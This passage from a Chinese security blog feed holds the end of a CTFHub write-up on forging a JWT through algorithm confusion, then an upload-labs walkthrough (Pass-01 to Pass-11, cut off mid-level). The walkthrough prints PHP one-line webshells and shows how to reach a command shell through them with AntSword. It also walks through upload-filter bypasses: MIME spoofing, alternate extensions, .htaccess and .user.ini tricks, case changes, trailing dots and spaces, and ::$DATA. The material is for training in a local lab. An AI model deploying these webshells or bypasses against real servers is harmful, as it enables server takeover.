src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918515.png"></p><p>看一下，加密方式是RS256，role是guest</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918630.png"></p><p>读一下源码，这里发现要读出flag需要几个条件。</p><ol><li><p>请求方式不是POST（这个简单，随便刷新一下就是GET，就不是POST），</p></li><li><p>cookie不为空且可以HS256解密（需要换加密方式，头部的alg字段也得由RS256改为HS256），</p></li><li><p>role要是admin（需要由guest修改为admin）</p></li></ol><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918971.png"></p><p>综上，我们编辑一下JWT的Header（头部）和Payload（负载）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">&#123;<span class="hljs-string">&quot;typ&quot;</span>:<span class="hljs-string">&quot;JWT&quot;</span>,<span class="hljs-string">&quot;alg&quot;</span>:<span class="hljs-string">&quot;HS256&quot;</span>&#125;&#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;role&quot;</span>:<span class="hljs-string">&quot;admin&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>Base64编码一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918258.png"></p><p>注意JWT是<strong>Base64URL。我们要</strong>去掉&#x3D;，然后别忘了在头部和负载之间加上<code>.</code></p><p>最后的结果是（大家可以直接复制）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.<br></code></pre></td></tr></table></figure><p>把它打印出来的JWT的Header（头部）和Payload（负载）改为我们刚编辑的</p><p>然后用jwt_tool工具修改，这里要注意在jwt_tool文件夹下将给我们的公钥写入publickey.pem</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918328.png"></p><p>jwt_tool工具生成JWT后按F12写入cookie中</p><p>然后再刷新（不要点Login，这是POST方法，POST方法不会输出flag）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021918178.png"></p>]]></content>
    
    
    <categories>
      
      <category>Web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTFHub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>upload-labs通关全详解</title>
    <link href="/2025/05/04/upload-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/"/>
    <url>/2025/05/04/upload-labs%E9%80%9A%E5%85%B3%E5%85%A8%E8%AF%A6%E8%A7%A3/</url>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>本文是作者由CSDN博客迁移而来，原文地址：<a href="https://blog.csdn.net/2302_81178149/article/details/145442006?spm=1001.2014.3001.5501">https://blog.csdn.net/2302_81178149/article/details/145442006?spm=1001.2014.3001.5501</a></p></blockquote><p>我们下面进行下一个漏洞——文件上传的学习。文件上传是常见漏洞之一，是Web安全入门必学漏洞。为探讨清楚文件上传漏洞的诸多细节，我们特选经典的upload-labs进行从入门到进阶的专项训练。</p><p>在做题过程中，作者把用到的知识进行了全面、详细、系统的总结，所以为了方便学习，查阅完全适配此文的总结是必不可少的（怎么可以光训练不去学习、总结呢）。</p><p>作者的总结：<a href="https://blog.csdn.net/2302_81178149/article/details/145433812" title="文件上传学习总结_文件上传学习 csdn-CSDN博客">文件上传学习总结_文件上传学习 csdn-CSDN博客</a></p><p>除此之外，</p><p>作者进行upload-labs靶场练习时，在环境配置上出了很多问题，吃了很多苦头。为了防止大家踩坑，也为了节省大家的时间，在这里直接给出最简单最有效的配置方法，请见下文。</p><p>upload-labs安装与配置：<a href="https://blog.csdn.net/2302_81178149/article/details/145423743?spm=1001.2014.3001.5501" title="upload-labs安装与配置-CSDN博客">upload-labs安装与配置-CSDN博客</a></p><p>upload-labs介绍见下图，</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956895.png"></p><h2 id="Pass-01"><a href="#Pass-01" class="headerlink" title="Pass-01"></a>Pass-01</h2><p>首先我们要写一个一句话木马文件，上传到服务器</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956669.png"></p><p>以我的一句话木马为例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956626.png"></p><p>上传一下试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956517.png"></p><p>失败了，文件类型不正确</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956755.png"></p><p>看一下提示，前端过滤</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956803.png"></p><p>那么我们怎么才能绕过呢？</p><p>方法一：利用浏览器的机制可以禁用js</p><p>方法二：删除浏览器事件</p><p>先试试禁用js。</p><p>不过在实战中直接禁用js插件会导致一些页面无法正常显示，还是存在着一些缺陷。</p><p>以火狐浏览器为例，按f12，在‘调试器’面板最右边有个设置按钮，禁用js。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956046.png"></p><p>上传试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956555.png"></p><p>在上传路径里找一下，成功上传</p><p>如何获得上传路径？</p><p>大家可以先上传一张图片，上传成功后会显示出上传的图片，然后右击图片——&gt;复制图像链接，图像链接就有上传路径</p><p>找到上传路径，发现是WWW\upload-labs文件夹里的upload，看一下</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956344.png"></p><p>发现webshell.php已经躺在里面了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021956188.png"></p><p>在网站里访问一下木马文件</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>localhost<span class="hljs-regexp">/upload-labs/u</span>pload/webshell.php<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958594.png"></p><p>虽然什么也没显示，但实际上我们已经成功了</p><p>可以用HackBar发送一个POST请求，带上我们一句话木马里的“key”值。</p><p>例如，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">key=<span class="hljs-title function_ invoke__">phpinfo</span>();<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957149.png"></p><p>发送后成功显示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957685.png"></p><p>这里我们介绍一下文件上传漏洞的常见利用方式——用‘中国蚁剑’之类的WebShell工具。</p><p>我们这里以用中国蚁剑为例，</p><p>先连接一下网站：右键添加数据</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957656.png"></p><p>输入网址和我们一句话木马里的密码“key”</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957627.png"></p><p>测试连接</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957893.png"></p><p>成功控制，双击打开我们刚刚打开的网站</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957789.png"></p><p>然后右键打开终端</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957189.png"></p><p>随便输入试试，例如用ipconfig查一下ip</p><p>显示了，说明我们可以操纵系统</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958372.png"></p><p>然后我们试试第二个绕过方法，删除浏览器事件</p><p>查看前端代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021957176.png"></p><p>很明显，上面代码就是过滤代码，我们这里把除过滤代码之外的代码复制一遍，放到.txt文件里，不要把过滤代码也复制了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958544.png"></p><p>然后在在上面添加一段action，地址是要将图片上传到哪的地址，我们在这加上来（如果不知道这个地址是什么，就回到正常的上传页面，然后随便上传一个图片，在F12开发者工具的”网络”模块中可以找到）</p><p>修改成上传地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">action=<span class="hljs-string">&quot;http://localhost/upload-labs/Pass-01/index.php&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958027.png"></p><p>将后缀改为html</p><p>然后用浏览器打开这个html文件，直接进行上传操作即可。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958115.png"></p><p>我这里又重新写了一个一句话木马，用GET型传参</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958737.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;function&#x27;</span>](<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958410.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958688.png"></p><p>访问webshell_get.php并且给‘function’和‘key’赋值，我们这次写的一句话木马是get传参形式的，</p><p><strong>eval函数在动态传参时，php的底层认为eval不是函数，所以我们用不了</strong></p><p><strong>但是assert函数在php底层却是以函数执行的，那么第一个参数我们就用assert</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell_get.php?function=assert&amp;key=phpinfo();</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958631.png"></p><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958846.png"></p><p>当然，我们可以改一改一句话木马，可以解决动态传参时eval失效的问题，而且只需要传一个参数，但是上面那种方法也要会。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;key&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958762.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell_get.php?key=phpinfo();</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958045.png"></p><p>注意右上角有显示源码、查看提示、清空上传文件。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021958742.png"></p><p>完成这一关我们别忘了清空上传文件，不清除的话，这一关的一句话木马还在里面，不能确定后面关卡上传的是否成功，</p><h2 id="Pass-02"><a href="#Pass-02" class="headerlink" title="Pass-02"></a>Pass-02</h2><p>为了方便，我们将一句话木马改写为：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">phpinfo</span>();<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>这样不需要传参，直接访问就可以判断是否成功。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959793.png"></p><p>先上传一个试试</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959644.png"></p><p>失败了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959046.png"></p><p>看看提示（大家要记住这个MIME检查，后面还会有）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959574.png"></p><p>用BurpSuite抓包看一下</p><p>我们可以看到我们的文件类型是application&#x2F;octet-stream（二进制数据类型）</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959488.png"></p><p>补充：</p><table><thead><tr><th>类型</th><th>描述</th><th>典型示例</th></tr></thead><tbody><tr><td>text</td><td>表明文件是普通文本，理论上是人类可读</td><td>text&#x2F;plain, text&#x2F;html, text&#x2F;css, text&#x2F;javascript</td></tr><tr><td>image</td><td>表明是某种图像。不包括视频，但是动态图（比如动态 gif）也使用 image 类型</td><td>image&#x2F;gif, image&#x2F;png, image&#x2F;jpeg, image&#x2F;bmp, image&#x2F;webp, image&#x2F;x-icon, image&#x2F;vnd.microsoft.icon</td></tr><tr><td>audio</td><td>表明是某种音频文件</td><td>audio&#x2F;midi, audio&#x2F;mpeg, audio&#x2F;webm, audio&#x2F;ogg, audio&#x2F;wav</td></tr><tr><td>video</td><td>表明是某种视频文件</td><td>video&#x2F;webm, video&#x2F;ogg</td></tr><tr><td>application</td><td>表明是某种二进制数据</td><td>application&#x2F;octet-stream, application&#x2F;pkcs12, application&#x2F;vnd.mspowerpoint, application&#x2F;xhtml+xml, application&#x2F;xml, application&#x2F;pdf</td></tr></tbody></table><p>既然它提示我们的是上传的数据类型不对，那么后端大概率检测的是我们上传文件的文件类型，那么我们在抓包这块将文件类型改为img的文件类型，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">image/jpeg<br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022004286.png"></p><p>注入成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959423.png"></p><p>访问一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959197.png"></p><h2 id="Pass-03"><a href="#Pass-03" class="headerlink" title="Pass-03"></a>Pass-03</h2><p>直接上传</p><p>不允许上传.asp,.aspx,.php,.jsp后缀文件！  </p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959098.png"></p><p>查看源码发现是黑名单验证，禁止上传这四种后缀的文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959045.png"></p><p>但是这里黑名单规则不严谨，在某些特定环境中某些特殊后缀不会被过滤且仍会被当作php文件解析。</p><p>常用过滤后缀：<code>php、php2、php3、php4、php5、php6、php7、pht、phtm、phtml</code>。</p><p>下面我们详细讲解一下。</p><p>PHP是一种广泛使用的开放源代码的服务器端脚本语言，主要用于Web开发。默认情况下，PHP文件具有.php扩展名，但是服务器可以被配置为接受其他文件扩展名作为PHP文件来处理。以下是一些可能被服务器配置为识别并解析为PHP脚本的文件扩展名：</p><p>1. <strong>.php</strong> - 这是最常见的PHP文件扩展名。</p><p>2. <strong>.php3</strong> - 早期的PHP版本使用的扩展名。</p><p>3. <strong>.php4</strong> - 用于PHP 4.x系列。</p><p>4. <strong>.php5</strong> - 用于PHP 5.x系列。</p><p>5. <strong>.php7</strong> - 用于PHP 7.x系列。</p><p>6. <strong>.php8</strong> - 用于PHP 8.x系列。</p><p>7. <strong>.phtml</strong> - 这是PHP混合HTML文件使用的另一个旧扩展名。</p><p>8. <strong>.phps</strong> - 用来显示源代码的高亮显示而不是执行它。</p><p>9. <strong>.html or .htm</strong> - 有时服务器被配置为执行嵌入在HTML文件中的PHP代码。</p><p>10. <strong>.inc</strong> - 有时用于包含文件，但这不是一个安全做法，因为它可能会暴露敏感代码。</p><p>关于配置：</p><p>服务器需要通过修改配置文件来支持上述其他扩展名。对于Apache服务器，这通常在<code>.htaccess</code>文件中或者直接在主配置文件<code>httpd.conf</code>中，使用<code>AddType</code>和<code>AddHandler</code>指令来完成。对于Nginx服务器，可以在<code>nginx.conf</code>中通过设置<code>location</code>块并使用<code>fastcgi_pass</code>指令来处理。</p><p>在Apache HTTP 服务器的配置中，<code>AddType</code> 指令用于将特定的 MIME 类型与文件扩展名相关联。</p><p>注意有一些使用最新phpstudy搭建的upload-labs这一关可能不成功，下述方法适用于作者上文写的环境配置。</p><p>这里先修改phpstudy的配置文件，打开phpstudy的httpd-conf配置文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959103.png"></p><p>修改 <code>AddType application/x-httpd-php .php .phtml</code> 为 <code>AddType application/x-httpd-php .php .phtml .php5</code>（自己想用啥就加啥，想用.php4就加.php4，我们这里以.php5为例），也可以多加几个，例如</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">AddType application/x-httpd-php .php .php3 .php4 .php5 .php6 .php7 .php8 .phtml<br></code></pre></td></tr></table></figure><p>修改完别忘了保存</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959684.png"></p><p>注意<code>AddType application/x-httpd-php .php .phtml</code>前面有可能有#，如果有也要删除。</p><p>然后重新启动phpstudy</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959602.png"></p><p>我们这里用.php5试一下，直接上传一个名为webshell.php5的文件，可以发现直接上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959524.png"></p><p>访问试试，发现不好使，看了看，原来是名字改了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959137.png"></p><p>再次访问，成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505021959731.png"></p><h2 id="Pass-04"><a href="#Pass-04" class="headerlink" title="Pass-04"></a>Pass-04</h2><p>发现黑名单比第三关多了很多，基本将我们的后缀都过滤掉了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000334.png"></p><p>该怎么进行绕过呢</p><p>这时候补充一个知识点：</p><p>.htaccess文件解析漏洞。</p><p>常见配法有以下几种：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php">AddHandler php5-script .jpg<br> <br>    <br> <br>AddType application/x-httpd-php .jpg<br> <br>    <br> <br>Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p>Sethandler 将该目录及子目录的所有文件均映射为php文件类型。</p><p>Addhandler 使用 php5-script 处理器来解析所匹配到的文件。</p><p>AddType 将特定扩展名文件映射为php文件类型。</p><p>简单来说就是，可以将我们所的文件都解析成php或者是特定的文件解析为php。</p><p>那么我们创建一个.htaccess文件</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000641.png"></p><p>写上内容：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">Sethandler application/x-httpd-php<br></code></pre></td></tr></table></figure><p>这是将本目录及所有子目录的所有文件都解析为php文件。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000720.png"></p><p>然后把我们的webshell.php改为1.jpg</p><p>我们先上传这个1.jpg文件，然后上传这个.htaccess，再访问1.jpg</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000023.png"></p><h2 id="Pass-05"><a href="#Pass-05" class="headerlink" title="Pass-05"></a>Pass-05</h2><p>这关多过滤了个.htaccess，看看提示</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000391.png"></p><p>我们可以用.user.ini去包含我们的代码，然后执行，.user.ini相当于一个用户自定义的php.ini。</p><p>user.ini ：自 PHP 5.3.0 起，PHP 支持基于每个目录的 .htaccess 风格的 INI 文件。此类文件仅被CGI／FastCGI SAPI 处理。此功能使得 PECL 的 htscanner 扩展作废。如果使用 Apache，则用.htaccess文件有同样效果。</p><p>除了主php.ini 之外，PHP 还会在每个目录下扫描 INI 文件，从被执行的 PHP 文件所在目录开始一直上升到 web根目录（$_SERVER[‘DOCUMENT_ROOT’] 所指定的）。如果被执行的 PHP文件在 web 根目录之外，则只扫描该目录。</p><p>在.user.ini 风格的 INI 文件中只有具有 PHP_INI_PERDIR 和 PHP_INI_USER 模式的 INI设置可被识别。</p><p>两个新的 INI 指令，user_ini.filename 和 user_ini.cache_ttl 控制着用户 INI 文件的使用。</p><p>user_ini.filename 设定了 PHP 会在每个目录下搜寻的文件名；如果设定为空字符串则 PHP 不会搜寻。默认值是 .user.ini。</p><p>user_ini.cache_ttl 控制着重新读取用户 INI 文件的间隔时间。默认是 300 秒（5 分钟）。</p><p>这关是关卡制作者最后加上的，所以这里最麻烦是要用PHP 5.3.0及其以后的版本，和我们配置的环境不一样。这里又要用上我们下载的21关压缩包，作者是把它解压缩在新版phpstudy里，然后用的php7（大家也可以在旧版phpstudy里换php版本）。</p><p>这里别忘了把php.ini中的user_ini.cache_ttl修改一下，要不然间隔时间太长了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005015.png"></p><p>先把上一关做的1.jpg上传</p><p>然后制作一个.user.ini文件</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">auto_prepend_file=<span class="hljs-number">1</span>.jpg<br></code></pre></td></tr></table></figure><p>.user.ini文件里的意思是：所有的php文件都自动包含我们刚刚上传的1.jpg文件，会将其执行。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000611.png"></p><p>然后上传.user.ini文件</p><p>我们已经要求php文件都自动包含我们刚刚上传的1.jpg文件，而1.jpg中有我们的一句话木马，也就是文件夹内所有的php都会包含我们的一句话木马。</p><p>接下来要做就是找个php文件访问，去执行我们的一句话木马。</p><p>这里我们并不能上传php文件，该怎么办呢？</p><p>不要忘了，upload文件夹里面一直有个readme.php，这时候它就派上用场了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000504.png"></p><p>访问一下它</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/readme.php</span><br></code></pre></td></tr></table></figure><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000150.png"></p><p>关掉新版本的phpstudy，打开我们的旧环境，下面题目还是用旧环境</p><h2 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h2><p>比较前面的源码可以发现，这关的源码没有把字符强制转换为小写的语句：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000098.png"></p><p>在这行代码中，strtolower函数被用于将变量$file_ext所包含的字符串转化为全小写。</p><p>所以，这道题是可以直接通过修改文件名为大写来绕过限制的。</p><p>所以我们上传一个1.PHP。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000839.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000664.png"></p><p>访问一下，发现失败了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022005113.png"></p><p>原来是把文件名改了，再次访问，成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000260.png"></p><p>这题就是服务器没有对上传文件的名称大小写进行限制，从而导致大小写绕过漏洞，攻击者可以通过替换文件名为大写绕过对.php的限制上传恶意代码。</p><h2 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h2><p>查看源码，发现这题没有对文件后缀名进行首尾去空的操作。</p><p>第四关中对文件后缀进行首尾去空的代码为（“&#x2F;&#x2F;首尾去空“，字打错了）：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000410.png"></p><p>这一行代码使用了PHP的trim函数对变量$file_ext所存储的字符串进行处理。trim函数的作用是去除字符串首尾的空白字符（包括空格、换行符、制表符等）</p><p>所以这里可以通过对文件后缀名末尾进行添加空格的方式来进行绕过。</p><p>因为Windows特性，在文件资源管理器中对后缀名添加空格的操作是不允许的，所以这里我们依旧需要使用Burpsuite抓包修改。</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000325.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000833.png"></p><p>上传之后文件被改名了，访问时注意一下</p><p>访问成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000620.png"></p><h2 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h2><p>还是看源码</p><p>可以看到这一关他确实把去除空格加上了，但是你仔细看，他是不是没有deldot()这个函数了（deldot()函数可以去除文件名末尾的点）。但上面说过，windows环境时会自动去除文件末尾的点和空格的，所以还是bp抓包</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000509.png"></p><p>很明显，上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000701.png"></p><p>访问一下试试</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure><p>成功了</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000866.png"></p><h2 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h2><p>废话不说，源码分析：</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022000121.png"></p><p>和之前的对比一下，发现少了下面这行代码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001738.png"></p><p>这关的过滤相较于上一关又少了一个过滤(::$DATA)的字符串</p><p><strong>解释：在windows环境下，不光会自动去除文件末尾的点和空格，同时(::$DATA)这个字符串，windows也会认为是非法字符，默认去除掉</strong></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001957.png"></p><p>上传成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001355.png"></p><p>上传的文件依然改了名</p><p>成功</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001257.png"></p><h2 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h2><p>还是看源码</p><p>可以看到，结合上面几个的过滤，转小写、空格、点、.htaccess、::$DATA都给我们防住了</p><p>那这时候该怎么办呢？</p><p>代码是死的，人是活的。每过一句代码，只执行一次，那我们就在文件末尾多加几个空格、点之类了，反正也就每执行一次只取出一个。</p><p>那我们直接末尾混合着多加几个</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001974.png"></p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001886.png"></p><p>上传成功</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">http:<span class="hljs-comment">//localhost/upload-labs/upload/webshell.php</span><br></code></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001386.png"></p><h2 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h2><p>看源码</p><p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202505022001123.png"></p><p>这一关明显不一样了，让我们来看看哪有洞</p><p>他在str_ireplace()函数这将我们的危险后缀都替换为空了，这该咋办。</p><p>还是那句话，代码死的，人是活的。他也就执行一次，那我们进行双写试试</p><p><img 